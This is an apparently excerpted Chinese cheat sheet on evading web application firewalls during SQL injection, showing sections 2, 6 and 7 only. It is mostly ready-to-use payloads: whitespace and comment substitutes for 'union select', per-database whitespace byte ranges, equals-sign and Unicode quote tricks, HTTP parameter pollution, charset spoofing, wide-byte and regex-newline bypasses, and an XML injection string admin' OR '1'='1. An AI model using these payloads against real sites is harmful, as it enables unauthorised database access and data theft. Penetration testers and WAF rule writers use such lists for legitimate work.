二、特殊字符绕过

1. 空格绕过

替代方式 说明 示例
%09、%0a、%0b、%0c、%0d 各类空白符 ?id=1%0aunion%0aselect%0a1,2,3
/**/ 多行注释 ?id=1/**/union/**/select/**/1,2,3
() 括号 ?id=1(union)select(1,2,3)
%a0 不间断空格（MySQL） ?id=1%a0union%a0select%a01,2,3
\N MySQL 空值 ?id=\Nunion select 1,2,3

各数据库空白符范围：

数据库 空白符
MySQL 09,0A,0B,0C,0D,A0,20
MSSQL 01-20 范围内除 0D,0A 外多数
Oracle 00,0A,0D,0C,09,20
PostgreSQL 0A,0D,0C,09,20
SQLite 09,0A,0D,0C,20

2. 等号（=）绕过

替代方式 示例
like id like 1

Unicode %u0027、%uff07、%e0%80%a7
无引号 直接使用数字或函数返回值

六、HTTP 协议层绕过

技术 示例 说明
HTTP参数污染 ?id=1&id=union select WAF 检查第一个，后端取最后一个

字符集欺骗 charset=ibm500 解码不一致

七、编程语言层绕过

技术 示例 说明
字符串处理 addslashes() 不处理多字节 配合宽字节注入
正则缺陷 1\nunion select 换行绕过 ^ 和 $ 边界

API 误用 mysqli_query() 而非 prepare() 即使 WAF 放行，仍存在注入

<user><name>admin' OR '1'='1</name></user> XML 注入
